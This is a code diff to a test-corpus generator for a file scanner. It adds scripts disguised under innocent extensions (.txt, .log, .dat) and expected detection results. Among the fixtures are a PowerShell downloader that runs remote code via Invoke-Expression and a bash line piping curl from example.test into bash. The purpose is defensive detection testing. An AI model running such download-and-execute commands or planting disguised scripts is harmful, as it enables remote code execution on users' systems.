@@ -24,10 +24,12 @@ PYTHON_DIR   = os.path.join(CORPUS_DIR, 'python')
 NATIVE_DIR   = os.path.join(CORPUS_DIR, 'native')
 PYSRC_DIR    = os.path.join(CORPUS_DIR, 'pysource')
 NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
+DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
 os.makedirs(NOTEBOOK_DIR, exist_ok=True)
+os.makedirs(DISGUISED_DIR, exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
@@ -278,6 +280,48 @@ write_text(os.path.join(NOTEBOOK_DIR, 'nb_malformed.ipynb'),
            json.dumps({"not_cells": [], "nbformat": 4}))
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Disguised scripts (v0.2) — real scripts under innocent extensions, NO shebang,
+# so detection must come from content signatures (signal #3).
+# ─────────────────────────────────────────────────────────────────────────────
+# PowerShell downloader disguised as .txt (classic evasion)
+write_text(os.path.join(DISGUISED_DIR, 'readme.txt'),
+    "[CmdletBinding()]\nparam($Url)\n"
+    "$wc = New-Object System.Net.WebClient\n"
+    "Invoke-Expression ($wc.DownloadString('http://example.test/p'))\n"
+    "Write-Host 'done'\n")
+
+# Bash script disguised as .log
+write_text(os.path.join(DISGUISED_DIR, 'output.log'),
+    "if [ -f /etc/passwd ]; then\n"
+    "  export TOKEN=abc\n"
+    "  curl http://example.test/x | bash\n"
+    "fi\n"
+    "echo done\n")
+
+# Python disguised as .dat
+write_text(os.path.join(DISGUISED_DIR, 'data.dat'),
+    "import os\n"
+    "import subprocess\n"
+    "def run():\n"
+    "    os.system('id')\n"
+    "if __name__ == '__main__':\n"
+    "    run()\n")
+
+# Batch disguised as .txt
+write_text(os.path.join(DISGUISED_DIR, 'notes2.txt'),
+    "@echo off\n"
+    "setlocal\n"
+    "set TARGET=%USERPROFILE%\n"
+    "goto end\n"
+    ":end\n")
+
+# Negative control — plain English prose, must NOT be flagged disguised
+write_text(os.path.join(DISGUISED_DIR, 'memo.txt'),
+    "This is a plain text memo about the project status.\n"
+    "We import lessons from past work and define our goals for next quarter.\n"
+    "Please print this document and review it before the meeting.\n")
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -298,6 +342,11 @@ manifest = {
         "notebook/nb_eval.ipynb":      {"expectBanditViaProjection": True},
         "notebook/nb_outputs.ipynb":   {"expectFinding": "NOTEBOOK-SAVED-OUTPUT"},
         "notebook/nb_malformed.ipynb": {"expectFinding": "NOTEBOOK-MALFORMED"},
+        "disguised/readme.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "powershell"},
+        "disguised/output.log":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "shell"},
+        "disguised/data.dat":    {"expectFinding": "MTS-DISGUISE-002", "detectedType": "python"},
+        "disguised/notes2.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "batch"},
+        "disguised/memo.txt":    {"expectNoDisguise": True},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
